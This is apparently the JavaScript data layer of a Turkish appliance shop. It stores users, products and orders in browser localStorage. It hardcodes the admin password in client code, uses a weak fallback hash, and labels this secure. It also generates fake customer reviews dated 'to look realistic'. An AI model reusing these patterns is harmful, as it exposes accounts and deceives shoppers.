// Local Database Engine - Dora Elektronik

class DatabaseEngine {
    constructor() {
        // Core tables
        this.collections = {
            users: 'dora_db_users',
            products: 'dora_db_products',
            orders: 'dora_db_orders',
            reviews: 'dora_db_reviews',
            coupons: 'dora_db_coupons',
            session: 'dora_db_session',
            payments: 'dora_db_payments'
        };
        this.initPromise = this.init();
    }

    async init() {
        // Seed if first time or version mismatch
        if (localStorage.getItem('dora_db_seeded') !== 'v17') {
            await this.seed();
        }
    }

    // SHA-256 secure password hashing using browser native Web Crypto API (with fallback for file:///)
    async hashPassword(password) {
        if (!crypto.subtle) {
            console.warn("Secure context not detected. Hashing password using fallback SHA-256 mock/obfuscation.");
            let hash = 0;
            for (let i = 0; i < password.length; i++) {
                const char = password.charCodeAt(i);
                hash = (hash << 5) - hash + char;
                hash |= 0;
            }
            let result = '';
            for (let i = 0; i < 8; i++) {
                const piece = Math.abs((hash ^ (i * 0x55555555)) * 0x1234567).toString(16);
                result += piece.padStart(8, '0');
            }
            return result.slice(0, 64);
        }

        const encoder = new TextEncoder();
        const data = encoder.encode(password);
        const hashBuffer = await crypto.subtle.digest('SHA-256', data);
        const hashArray = Array.from(new Uint8Array(hashBuffer));
        return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
    }

    // Input sanitization to prevent XSS (Cross-Site Scripting)
    sanitizeInput(text) {
        if (typeof text !== 'string') return text;
        const map = {
            '&': '&amp;',
            '<': '&lt;',
            '>': '&gt;',
            '"': '&quot;',
            "'": '&#x27;',
            '/': '&#x2F;',
        };
        const reg = /[&<>"'/]/ig;
        return text.replace(reg, (match) => map[match]);
    }

    // Fetch whole collection
    getCollection(name) {
        const key = this.collections[name];
        const data = localStorage.getItem(key);
        return data ? JSON.parse(data) : [];
    }

    // Save whole collection
    saveCollection(name, data) {
        const key = this.collections[name];
        localStorage.setItem(key, JSON.stringify(data));
    }

    // Database Seeding
    async seed() {
        // 1. Seed Products (based on original products.js)
        const initialProducts = [
    {
        "id": 1,
        "brand": "Dyson",
        "title": "Airwrap™ i.d. Çok Amaçlı Saç Şekillendirme Cihazı",
        "category": "guzellik",
        "oldPrice": 34000,
        "newPrice": 29999,
        "image": "images/dyson_airwrap_complete_1782046094385.png",
        "sizes": [
            "Ceramic Pink",
            "Ceramic Apricot",
            "Prussian Blue"
        ],
        "stock": 5,
        "colors": [
            {
                "name": "Ceramic Pink",
                "hex": "#f8c2c6",
                "image": "images/dyson_airwrap_complete_1782046094385.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Ceramic Apricot",
                "hex": "#f4a261",
                "image": null,
                "filterClass": "filter-none"
            },
            {
                "name": "Prussian Blue",
                "hex": "#1d3557",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Dyson'un en yeni saç şekillendiricisi Airwrap™ i.d. akıllı telefon entegrasyonu ve Bluetooth bağlantısı ile kişiselleştirilmiş şekillendirme profilleri oluşturur. Coanda etkisiyle saçları aşırı ısı hasarı olmadan şekillendirir, kurutur ve pürüzsüzleştirir."
    },
    {
        "id": 2,
        "brand": "Roborock",
        "title": "S8 Pro Ultra Akıllı Robot Süpürge ve Çöp İstasyonu",
        "category": "temizlik",
        "oldPrice": 105000,
        "newPrice": 94999,
        "image": "images/roborock_s8.png",
        "sizes": [
            "Siyah",
            "Beyaz"
        ],
        "stock": 3,
        "colors": [
            {
                "name": "Siyah",
                "hex": "#1a1a1a",
                "image": "images/roborock_s8.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Beyaz",
                "hex": "#ffffff",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "DuoRoller Riser fırça ve VibraRise 2.0 paspaslama sistemiyle Roborock S8 Pro Ultra, ev temizliğini tamamen eller serbest hale getiriyor. Kendini yıkayan, kurutan ve çöpünü boşaltan hepsi bir arada akıllı şarj istasyonu ile maksimum konfor sağlar."
    },
    {
        "id": 3,
        "brand": "KitchenAid",
        "title": "Artisan 4.8 L Stand Mikser ve Mutfak Şefi",
        "category": "mutfak",
        "oldPrice": 48000,
        "newPrice": 41999,
        "image": "images/kitchenaid_mixer.png",
        "sizes": [
            "İmparator Kırmızı",
            "Mat Siyah",
            "Krem"
        ],
        "stock": 4,
        "colors": [
            {
                "name": "İmparator Kırmızı",
                "hex": "#a8201a",
                "image": "images/kitchenaid_mixer.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Mat Siyah",
                "hex": "#222222",
                "image": null,
                "filterClass": "filter-none"
            },
            {
                "name": "Krem",
                "hex": "#fdf6e2",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Efsanevi tasarımı ve sağlam metal yapısıyla mutfağınızın baş köşesini süsleyecek KitchenAid Artisan Mikser. 10 farklı hız kademesi, 4.8 litrelik paslanmaz çelik haznesi ve zengin aparat seçenekleriyle her türlü hamur işi ve karıştırma tarifini zahmetsizce hazırlar."
    },
    {
        "id": 4,
        "brand": "Nespresso",
        "title": "Vertuo Lattissima Kapsüllü Kahve Makinesi",
        "category": "kahve",
        "oldPrice": 28000,
        "newPrice": 23999,
        "image": "images/nespresso_lattissima_one_1782046170712.png",
        "sizes": [
            "Mat Beyaz",
            "Siyah"
        ],
        "stock": 6,
        "colors": [
            {
                "name": "Mat Beyaz",
                "hex": "#f9f9f9",
                "image": "images/nespresso_lattissima_one_1782046170712.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Siyah",
                "hex": "#111111",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Tek bir tuşla kremamsı cappuccino, latte macchiato veya sade kahve çeşitleri hazırlayabileceğiniz Nespresso Vertuo Lattissima. Centrifusion™ teknolojisiyle her fincan için mükemmel kremayı hazırlar, süt köpürtme sistemiyle barista kalitesinde tarifler sunar."
    },
    {
        "id": 5,
        "brand": "Philips",
        "title": "Lumea IPL Series 9000 Epilasyon Cihazı",
        "category": "guzellik",
        "oldPrice": 16000,
        "newPrice": 12999,
        "image": "images/philips_lumea.png",
        "sizes": [
            "Standart"
        ],
        "stock": 8,
        "colors": [
            {
                "name": "Standart",
                "hex": "#f3e1e1",
                "image": "images/philips_lumea.png",
                "filterClass": "filter-none"
            }
        ],
        "description": "SenseIQ teknolojisine sahip Philips Lumea Series 9000, tüy gelişimini engellemek için ışık atımları (IPL) kullanır. Akıllı başlıkları sayesinde vücut kıvrımlarına özel programlar uygular, cilt tonu sensörüyle en güvenli ve etkili atım seviyesini otomatik belirler."
    },
    {
        "id": 6,
        "brand": "Dyson",
        "title": "Airstrait™ Islak Saç Düzleştirici",
        "category": "guzellik",
        "oldPrice": 26000,
        "newPrice": 22499,
        "image": "images/dyson_airstrait.png",
        "sizes": [
            "Bakır",
            "Prussian Mavi"
        ],
        "stock": 4,
        "colors": [
            {
                "name": "Bakır",
                "hex": "#b87333",
                "image": "images/dyson_airstrait.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Prussian Mavi",
                "hex": "#1b2a47",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Saçları ıslaktan kuruya sadece hava gücü kullanarak düzleştirir. Aşırı ısı hasarı olmadan, plakalar yerine yüksek basınçlı hava akımı sayesinde saç tellerini düzleştirirken doğal hacmini korur ve parlaklık katar."
    },
    {
        "id": 7,
        "brand": "Cosori",
        "title": "Dual Blaze 6.4 L Çift Rezistanslı Akıllı Airfryer",
        "category": "mutfak",
        "oldPrice": 7500,
        "newPrice": 5999,
        "image": "images/cosori_airfryer.png",
        "sizes": [
            "Koyu Gri",
            "Kırmızı"
        ],
        "stock": 10,
        "colors": [
            {
                "name": "Koyu Gri",
                "hex": "#3a3d40",
                "image": "images/cosori_airfryer.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Kırmızı",
                "hex": "#b52b2b",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Çift ısıtma elemanı sayesinde yiyecekleri alt-üst çevirmeye gerek kalmadan eşit ve çıtır şekilde pişiren Cosori Dual Blaze. 6.4 litrelik geniş kapasitesi, akıllı telefon kontrolü ve pratik temizleme özellikleri ile mutfakta geçirdiğiniz zamanı yarıya indirir."
    },
    {
        "id": 8,
        "brand": "Roborock",
        "title": "Q Revo MaxV Sıcak Suyla Paspas Yıkayan Robot Süpürge",
        "category": "temizlik",
        "oldPrice": 48000,
        "newPrice": 41999,
        "image": "images/roborock_qrevo.png",
        "sizes": [
            "Beyaz",
            "Siyah"
        ],
        "stock": 5,
        "colors": [
            {
                "name": "Beyaz",
                "hex": "#ffffff",
                "image": "images/roborock_qrevo.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Siyah",
                "hex": "#1c1d1f",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Rocky AI sesli asistanı ve FlexiArm kenar temizleme teknolojisine sahip Roborock Q Revo MaxV. 60°C sıcak suyla paspas yıkayarak ve kurutarak maksimum hijyen sağlar. 7000 Pa yüksek emiş gücü ve akıllı engelden kaçma özelliği bulunur."
    },
    {
        "id": 10,
        "brand": "De'Longhi",
        "title": "La Specialista Prestigio Manuel Espresso Makinesi",
        "category": "kahve",
        "oldPrice": 54000,
        "newPrice": 47999,
        "image": "images/delonghi_espresso.png",
        "sizes": [
            "Metalik Gri",
            "Mat Siyah"
        ],
        "stock": 3,
        "colors": [
            {
                "name": "Metalik Gri",
                "hex": "#a6a6a6",
                "image": "images/delonghi_espresso.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Mat Siyah",
                "hex": "#1c1c1c",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Tutkulu kahve severler için tasarlanmış, barista kalitesinde kahve deneyimi sunan De'Longhi La Specialista. Sensörlü Öğütme Teknolojisi, Akıllı Sıkıştırma İstasyonu ve Aktif Sıcaklık Kontrolü özellikleri ile kahve çekirdeklerinin aromalarını mükemmel şekilde açığa çıkarır."
    },
    {
        "id": 11,
        "brand": "Theragun",
        "title": "PRO G5 Akıllı Perküsif Terapi Cihazı",
        "category": "guzellik",
        "oldPrice": 22000,
        "newPrice": 18999,
        "image": "images/theragun_pro.png",
        "sizes": [
            "Siyah"
        ],
        "stock": 6,
        "colors": [
            {
                "name": "Siyah",
                "hex": "#111111",
                "image": "images/theragun_pro.png",
                "filterClass": "filter-none"
            }
        ],
        "description": "Kondisyon ve kas toparlanmasında dünya lideri Theragun PRO G5. Kişiselleştirilebilir hız ayarları, OLED ekranı ve ultra sessiz EQ150 fırçasız motoru ile profesyonel düzeyde masaj ve derin kas terapisi sunar. Mobil uygulama entegrasyonu mevcuttur."
    },
    {
        "id": 12,
        "brand": "SMEG",
        "title": "Retro Espresso Kahve Makinesi",
        "category": "kahve",
        "oldPrice": 21000,
        "newPrice": 17499,
        "image": "images/smeg_espresso.png",
        "sizes": [
            "Krem",
            "Pastel Pembe",
            "Pastel Mavi"
        ],
        "stock": 5,
        "colors": [
            {
                "name": "Krem",
                "hex": "#f2ece1",
                "image": "images/smeg_espresso.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Pastel Pembe",
                "hex": "#f2d2d9",
                "image": null,
                "filterClass": "filter-none"
            },
            {
                "name": "Pastel Mavi",
                "hex": "#d1e4e6",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "50'lerin ikonik retro tarzını yansıtan şık tasarımı ve kompakt yapısıyla mutfaklara İtalyan şıklığı getiren SMEG Espresso Makinesi. 15 bar basınç sistemi, Thermoblock ısıtma sistemi ve Cappuccino sistemi ile lezzetli espresso ve süt köpüklü kahveler hazırlar."
    },
    {
        "id": 13,
        "brand": "Dyson",
        "title": "Supersonic Nural™ Saç Kurutma Makinesi",
        "category": "guzellik",
        "oldPrice": 24000,
        "newPrice": 19999,
        "image": "images/dyson_supersonic.png",
        "sizes": [
            "Vinca Blue",
            "Ceramic Patina"
        ],
        "stock": 4,
        "colors": [
            {
                "name": "Vinca Blue",
                "hex": "#1f2d3d",
                "image": "images/dyson_supersonic.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Ceramic Patina",
                "hex": "#c3b091",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Dyson'ın en akıllı saç kurutma makinesi Supersonic Nural™. Time-of-Flight mesafe sensörüyle saç ile arasındaki mesafeyi ölçerek ısıyı otomatik ayarlar ve saç derisini aşırı ısı hasarından korur. Akıllı başlık tanıma sistemiyle her başlığa özel hava akımı ve sıcaklık ayarını hatırlar."
    },
    {
        "id": 14,
        "brand": "SMEG",
        "title": "Retro 2 Dilimli Ekmek Kızartma Makinesi",
        "category": "mutfak",
        "oldPrice": 9500,
        "newPrice": 7499,
        "image": "images/smeg_toaster.png",
        "sizes": [
            "Krem",
            "Pastel Pembe",
            "Kırmızı"
        ],
        "stock": 6,
        "colors": [
            {
                "name": "Krem",
                "hex": "#f2ece1",
                "image": "images/smeg_toaster.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Pastel Pembe",
                "hex": "#f2d2d9",
                "image": null,
                "filterClass": "filter-none"
            },
            {
                "name": "Kırmızı",
                "hex": "#b52b2b",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "50'lerin ikonik retro estetiğini yansıtan SMEG Ekmek Kızartma Makinesi. 6 farklı kızartma kademesi, buz çözme, yeniden ısıtma ve bagel fonksiyonları ile ekmeklerinizi dilediğiniz kıvamda kızartır. Paslanmaz çelik gövdesi ve kırıntı tepsisi ile son derece kullanışlıdır."
    },
    {
        "id": 15,
        "brand": "Roborock",
        "title": "Dyad Pro Islak Kuru Dikey Süpürge",
        "category": "temizlik",
        "oldPrice": 27000,
        "newPrice": 22999,
        "image": "images/roborock_dyad.png",
        "sizes": [
            "Standart"
        ],
        "stock": 5,
        "colors": [
            {
                "name": "Standart",
                "hex": "#222222",
                "image": "images/roborock_dyad.png",
                "filterClass": "filter-none"
            }
        ],
        "description": "Zorlu ıslak ve kuru kirleri tek geçişte temizleyen Roborock Dyad Pro dikey zemin temizleyici. DyadPower™ çoklu rulo temizleme sistemi ve kenardan kenara temizleme özelliğiyle dip köşe temizlik sunar. Akıllı kir algılama ve otomatik deterjan dağıtımı bulunur."
    },
    {
        "id": 16,
        "brand": "Breville",
        "title": "Barista Express Manuel Espresso Makinesi",
        "category": "kahve",
        "oldPrice": 42000,
        "newPrice": 34999,
        "image": "images/breville_barista.png",
        "sizes": [
            "Çelik Gri"
        ],
        "colors": [
            {
                "name": "Çelik Gri",
                "hex": "#8a9597",
                "image": "images/breville_barista.png",
                "filterClass": "filter-none"
            }
        ],
        "description": "Evde profesyonel üçüncü dalga kahve deneyimi sunan efsanevi Breville Barista Express. Dahili konik dişli değirmeni ile taze çekilmiş çekirdeklerden tam zamanında çekim yapar. Dijital sıcaklık kontrolü (PID) ve güçlü buhar çubuğu ile mükemmel espresso ve süt köpüklü kahveler sunar."
    },
    {
        "id": 17,
        "brand": "Shark",
        "title": "FlexStyle™ 5'i 1 Arada Saç Şekillendirme ve Kurutma Sistemi",
        "category": "guzellik",
        "oldPrice": 19000,
        "newPrice": 15999,
        "image": "images/dyson_airwrap.png",
        "sizes": [
            "Siyah/Gold",
            "Taş Grisi"
        ],
        "stock": 5,
        "colors": [
            {
                "name": "Siyah/Gold",
                "hex": "#d4af37",
                "image": "images/dyson_airwrap.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Taş Grisi",
                "hex": "#708090",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Tek bir bükme hareketiyle güçlü bir saç kurutma makinesinden çok yönlü bir şekillendiriciye dönüşen Shark FlexStyle. Aşırı ısı hasarı olmadan Coanda etkisiyle bukleler oluşturur, düzleştirir, hacim verir ve pürüzsüzleştirir."
    },
    {
        "id": 18,
        "brand": "FOREO",
        "title": "LUNA™ 4 Akıllı Yüz Temizleme ve Sıkılaştırıcı Masaj Cihazı",
        "category": "guzellik",
        "oldPrice": 10500,
        "newPrice": 8499,
        "image": "images/foreo_luna_1782046017874.png",
        "sizes": [
            "Şeftali (Hassas Cilt)",
            "Lavanta (Karma Cilt)"
        ],
        "stock": 6,
        "colors": [
            {
                "name": "Şeftali (Hassas Cilt)",
                "hex": "#ffccb3",
                "image": "images/foreo_luna_1782046017874.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Lavanta (Karma Cilt)",
                "hex": "#e6e6fa",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "T-Sonic™ titreşimleri ve ultra hijyenik yumuşak silikon temas noktalarıyla cildinizi kirden, yağdan ve makyaj kalıntılarından %99 oranında arındıran FOREO LUNA 4. Farklı masaj modları sayesinde ince çizgi görünümünü azaltır ve cildin kan dolaşımını hızlandırır."
    },
    {
        "id": 19,
        "brand": "Braun",
        "title": "Silk-expert Pro 5 IPL Tüy Alma Cihazı",
        "category": "guzellik",
        "oldPrice": 18000,
        "newPrice": 14999,
        "image": "images/braun_silkexpert_1782046006482.png",
        "sizes": [
            "Beyaz/Gold"
        ],
        "stock": 4,
        "colors": [
            {
                "name": "Beyaz/Gold",
                "hex": "#f5f5dc",
                "image": "images/braun_silkexpert_1782046006482.png",
                "filterClass": "filter-none"
            }
        ],
        "description": "Braun'un en güvenli ve hızlı IPL epilasyon cihazı. Skin Pro 2.0 (SensoAdapt™) cilt sensörü, cilt tonunuzu saniyede 80 kez okuyarak ışık atım gücünü otomatik ayarlar. Ev konforunda sadece 4 haftada gözle görülür tüy azalması sağlar."
    },
    {
        "id": 20,
        "brand": "Dyson",
        "title": "Corrale™ Kablosuz Saç Düzleştirici",
        "category": "guzellik",
        "oldPrice": 22000,
        "newPrice": 18999,
        "image": "images/dyson_corrale_1782045996038.png",
        "sizes": [
            "Fuşya/Nikel",
            "Bakır/Nikel"
        ],
        "stock": 4,
        "colors": [
            {
                "name": "Fuşya/Nikel",
                "hex": "#de3163",
                "image": "images/dyson_corrale_1782045996038.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Bakır/Nikel",
                "hex": "#b87333",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Saç tellerini bir araya getirmek için esneyen bakır alaşımlı plakalara sahip tek düzleştirici Dyson Corrale. Kablosuz kullanım özgürlüğüyle saçlarınızı daha az ısı hasarı, daha az kırılma ve mükemmel pürüzsüzlükle şekillendirir."
    },
    {
        "id": 21,
        "brand": "L'Oreal",
        "title": "SteamPod 4.0 Buharlı Saç Şekillendirici ve Düzleştirici",
        "category": "guzellik",
        "oldPrice": 14000,
        "newPrice": 11499,
        "image": "images/loreal_steampod_1782045984075.png",
        "sizes": [
            "Beyaz"
        ],
        "colors": [
            {
                "name": "Beyaz",
                "hex": "#ffffff",
                "image": "images/loreal_steampod_1782045984075.png",
                "filterClass": "filter-none"
            }
        ],
        "description": "Kuru saçtan şekillendirmeye kadar patentli kuru buhar teknolojisiyle saçları şekillendiren profesyonel SteamPod 4.0. Saç tellerine zarar vermeden, daha hızlı ve 3 kat daha düz, pürüzsüz ve parlak sonuçlar elde etmenizi sağlar."
    },
    {
        "id": 23,
        "brand": "Roborock",
        "title": "S8 MaxV Ultra Akıllı Robot Süpürge ve Sıcak Su İstasyonu",
        "category": "temizlik",
        "oldPrice": 125000,
        "newPrice": 114999,
        "image": "images/roborock_s8maxv_1782046035907.png",
        "sizes": [
            "Siyah",
            "Beyaz"
        ],
        "stock": 3,
        "colors": [
            {
                "name": "Siyah",
                "hex": "#1c1c1c",
                "image": "images/roborock_s8maxv_1782046035907.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Beyaz",
                "hex": "#ffffff",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Roborock'un en gelişmiş amiral gemisi robot süpürgesi S8 MaxV Ultra. FlexiArm yan fırçası ve kenar paspas sistemiyle köşelerde sıfır toz bırakır. 10.000 Pa yüksek emiş gücü, sıcak suyla paspas yıkama, deterjan dağıtımı ve sesli asistan özellikleriyle eller serbest temizliği zirveye taşır."
    },
    {
        "id": 24,
        "brand": "Xiaomi",
        "title": "Robot Vacuum X20+ Akıllı Mop İstasyonlu Robot Süpürge",
        "category": "temizlik",
        "oldPrice": 29000,
        "newPrice": 25999,
        "image": "images/xiaomi_x20_1782046046022.png",
        "sizes": [
            "Beyaz"
        ],
        "colors": [
            {
                "name": "Beyaz",
                "hex": "#f8f9fa",
                "image": "images/xiaomi_x20_1782046046022.png",
                "filterClass": "filter-none"
            }
        ],
        "description": "Yüksek performansı erişilebilir kılan Xiaomi Robot Vacuum X20+. Kendini temizleyen, mopları kurutan ve toz haznesini otomatik boşaltan akıllı istasyonuyla temizlik zahmetini minimuma indirir. LDS lazer navigasyonu ve 6000 Pa emiş gücü mevcuttur."
    },
    {
        "id": 26,
        "brand": "Philips",
        "title": "AquaTrio Series 9000 3'ü 1 Arada Kablosuz Islak Kuru Süpürge",
        "category": "temizlik",
        "oldPrice": 32000,
        "newPrice": 28499,
        "image": "images/philips_aquatrio_1782046056439.png",
        "sizes": [
            "Siyah/Mavi"
        ],
        "stock": 4,
        "colors": [
            {
                "name": "Siyah/Mavi",
                "hex": "#0a3d62",
                "image": "images/philips_aquatrio_1782046056439.png",
                "filterClass": "filter-none"
            }
        ],
        "description": "Hem süpüren hem paspaslayan hem de dökülen sıvıları çeken Philips AquaTrio 9000. AquaSpin başlığı zeminleri aktif şekilde yıkar, patentli kendi kendini temizleme teknolojisi ruloları ve fırçayı her kullanımdan sonra temiz tutar."
    },
    {
        "id": 27,
        "brand": "KitchenAid",
        "title": "Artisan 1.5 L Ayarlanabilir Sıcaklıklı Su Isıtıcısı",
        "category": "mutfak",
        "oldPrice": 11500,
        "newPrice": 9999,
        "image": "images/kitchenaid_kettle_1782046065471.png",
        "sizes": [
            "İmparator Kırmızı",
            "Mat Siyah",
            "Krem"
        ],
        "stock": 5,
        "colors": [
            {
                "name": "İmparator Kırmızı",
                "hex": "#a8201a",
                "image": "images/kitchenaid_kettle_1782046065471.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Mat Siyah",
                "hex": "#222222",
                "image": null,
                "filterClass": "filter-none"
            },
            {
                "name": "Krem",
                "hex": "#fdf6e2",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Mutfağına şıklık katacak çift cidarlı gövdeye sahip KitchenAid Artisan Su Isıtıcısı. 50°C'den 100°C'ye kadar ayarlanabilir sıcaklık kontrolü sayesinde çay ve kahvelerinizi en doğru ısıda demlemenizi sağlar. Sıcaklık göstergesi aktiftir."
    },
    {
        "id": 28,
        "brand": "SMEG",
        "title": "Retro HBF02 El Blenderı Seti",
        "category": "mutfak",
        "oldPrice": 10500,
        "newPrice": 8999,
        "image": "images/smeg_blender_1782046073822.png",
        "sizes": [
            "Krem",
            "Pastel Pembe",
            "Kırmızı"
        ],
        "stock": 6,
        "colors": [
            {
                "name": "Krem",
                "hex": "#f2ece1",
                "image": "images/smeg_blender_1782046073822.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Pastel Pembe",
                "hex": "#f2d2d9",
                "image": null,
                "filterClass": "filter-none"
            },
            {
                "name": "Kırmızı",
                "hex": "#b52b2b",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "50'lerin retro tarzı tasarımı ve 700W güçlü motoruyla SMEG El Blenderı Seti. Ayarlanabilir hız kontrolü ve turbo fonksiyonu ile pürüzsüz sonuçlar sunar. Doğrayıcı, çırpıcı, püre ezici ve karıştırma sürahisi aksesuarlarıyla tam settir."
    },
    {
        "id": 32,
        "brand": "Nespresso",
        "title": "Vertuo Pop Kapsüllü Kahve Makinesi",
        "category": "kahve",
        "oldPrice": 6500,
        "newPrice": 5499,
        "image": "images/nespresso_lattissima.png",
        "sizes": [
            "Hindistan Cevizi Beyazı",
            "Pasifik Mavisi",
            "Baharat Sarısı"
        ],
        "stock": 8,
        "colors": [
            {
                "name": "Hindistan Cevizi Beyazı",
                "hex": "#f5f6fa",
                "image": "images/nespresso_lattissima.png",
                "filterClass": "filter-none"
            },
            {
                "name": "Pasifik Mavisi",
                "hex": "#2f3542",
                "image": null,
                "filterClass": "filter-none"
            },
            {
                "name": "Baharat Sarısı",
                "hex": "#eccc68",
                "image": null,
                "filterClass": "filter-none"
            }
        ],
        "description": "Kompakt ve enerjik tasarımıyla Nespresso Vertuo Pop. Centrifusion™ teknolojisiyle kapsüldeki barkodu okuyarak mükemmel aromayı ve zengin kremayı hazırlar. 4 farklı fincan boyutunda kahve demleme seçeneği sunar."
    }
];

        this.saveCollection('products', initialProducts);

        // 2. Seed Users (Admin with strong unbreakable password)
        const adminPasswordHash = await this.hashPassword('DoraElektronik@Admin2026!Secure');
        const customerPasswordHash = await this.hashPassword('customer1234');
        const initialUsers = [
            {
                id: 1,
                email: 'admin@doraelektronik.com',
                password: adminPasswordHash,
                name: 'Yönetici (Admin)',
                phone: '0500 000 0000',
                address: 'Dora Elektronik Premium Merkez Depo, İstanbul',
                role: 'admin',
                created_at: new Date().toISOString()
            },
            {
                id: 2,
                email: 'customer@doraelektronik.com',
                password: customerPasswordHash,
                name: 'Selin Yılmaz',
                phone: '0555 123 4567',
                address: 'Nişantaşı, Teşvikiye Cd. No:12 D:4, Şişli/İstanbul',
                role: 'customer',
                created_at: new Date().toISOString()
            }
        ];
        this.saveCollection('users', initialUsers);

        // 3. Seed Coupons
        const initialCoupons = [
            { code: 'DORADANSIZE', discountPercent: 30, active: true },
            { code: 'DORA20', discountPercent: 20, active: true },
            { code: 'DORA10', discountPercent: 10, active: true }
        ];
        this.saveCollection('coupons', initialCoupons);

        // 4. Seed Reviews (matching mock data)
        const authors = [
            "Zeynep Y.", "Merve K.", "Ece A.", "Ayşe T.", "Deniz B.", 
            "Selin G.", "Aslıhan E.", "Ebru U.", "Ceren T.", "Buse A.", 
            "Yasemin S.", "Derya K.", "Melis B.", "Selin K.", "Gözde Y.", 
            "Bahar K.", "Ebru N.", "Didem A.", "Sinem T.", "Gizem B.",
            "Eylül Y.", "Merve D.", "Sezin Ö.", "Ayla T.", "Nilüfer S.", 
            "Ceren G.", "Hale A.", "Elif B.", "Tuğba K.", "Demet T.", 
            "Burcu V.", "Aslı G.", "Pınar E.", "Büşra N.", "Gözde M.", 
            "Melda K.", "Zeynep U.", "Füsun Y.", "Dilan Ç.", "Selin Y."
        ];
        
        const reviewTexts = {
            guzellik: [
                "Ürünü bir süredir kullanıyorum, çok memnun kaldım. Kesinlikle tavsiye ederim.",
                "Tasarımı çok şık ve kullanımı son derece pratik. Saçlarımı hiç yıpratmıyor.",
                "Beklentilerimin çok üzerinde bir performans sundu. Paketleme de harikaydı.",
                "Fiyatını sonuna kadar hak eden premium bir cihaz. Saçlarım kuaförden çıkmış gibi pürüzsüz.",
                "Çok hızlı elime ulaştı. Kalitesini ilk dokunuşta hissediyorsunuz."
            ],
            temizlik: [
                "Evdeki en büyük yardımcım oldu. Emiş gücü harika, temizlik süresi yarıya indi.",
                "Kendini temizleme ve kurutma özellikleri mükemmel çalışıyor. Çok pratik.",
                "Malzeme kalitesi üst düzey. Köşeleri ve kenarları çok iyi temizliyor.",
                "Çok sessiz çalışıyor ve performansı muazzam. Her kuruşuna değer.",
                "Tasarımı çok şık, temizliği tamamen zahmetsiz hale getiriyor."
            ],
            mutfak: [
                "Mutfakta yemek yapmayı keyifli hale getiren harika bir yardımcı.",
                "Retro tarzı tasarımı tezgahıma çok yakıştı. Kalitesi mükemmel.",
                "Çok güçlü ve sessiz bir motoru var. Malzemeleri pürüzsüz karıştırıyor.",
                "Kullanımı ve temizliği çok kolay. Kesinlikle mutfağın yıldızı.",
                "Çok sağlam ve dayanıklı bir yapısı var. Herkese tavsiye ederim."
            ],
            kahve: [
                "Her sabah barista kalitesinde kahve içmek muazzam bir lüks. Çok başarılı.",
                "Kahve köpüğü ve kreması harika. Kullanımı son derece kolay ve pratik.",
                "Tasarımı mutfağıma çok şık bir hava kattı. Çekirdekleri çok iyi öğütüyor.",
                "Tek tuşla mükemmel latte ve espresso hazırlıyor. Temizliği de çok basit.",
                "Kahve severlerin kesinlikle edinmesi gereken harika bir makine."
            ]
        };

        const initialReviews = {};
        initialProducts.forEach(product => {
            const cat = product.category;
            const texts = reviewTexts[cat] || reviewTexts['guzellik'];
            initialReviews[product.id] = [];
            
            // Generate 5 reviews per product
            for (let i = 0; i < 5; i++) {
                const author = authors[(product.id * 5 + i) % authors.length];
                const rating = (i === 2 || i === 4) ? 4 : 5; // 3 reviews are 5-star, 2 reviews are 4-star -> average 4.6
                // Subtract 1 day for each review to look realistic
                const dateOffset = new Date(Date.now() - i * 24 * 60 * 60 * 1000);
                const dateStr = `${String(dateOffset.getDate()).padStart(2, '0')}.${String(dateOffset.getMonth() + 1).padStart(2, '0')}.${dateOffset.getFullYear()}`;
                
                initialReviews[product.id].push({
                    author: author,
                    rating: rating,
                    date: dateStr,
                    text: texts[i]
                });
            }
        });
        this.saveCollection('reviews', initialReviews);

        // 5. Seed Orders (Empty initially)
        this.saveCollection('orders', []);

        // Mark as seeded with version 9
        localStorage.setItem('dora_db_seeded', 'v17');
    }

    // User Operations
    async register(name, email, password, phone, address) {
        const sanitizedName = this.sanitizeInput(name);
        const sanitizedEmail = this.sanitizeInput(email).toLowerCase().trim();
        const sanitizedPhone = this.sanitizeInput(phone);
        const sanitizedAddress = this.sanitizeInput(address);

        const users = this.getCollection('users');
        
        // Check if user exists
        if (users.find(u => u.email === sanitizedEmail)) {
            throw new Error('Bu e-posta adresiyle zaten kayıtlı bir kullanıcı bulunuyor.');
        }

        const passwordHash = await this.hashPassword(password);
        const newId = users.length > 0 ? Math.max(...users.map(u => u.id)) + 1 : 1;
        
        const newUser = {
            id: newId,
            email: sanitizedEmail,
            password: passwordHash,
            name: sanitizedName,
            phone: sanitizedPhone,
            address: sanitizedAddress,
            role: 'customer',
            created_at: new Date().toISOString()
        };

        users.push(newUser);
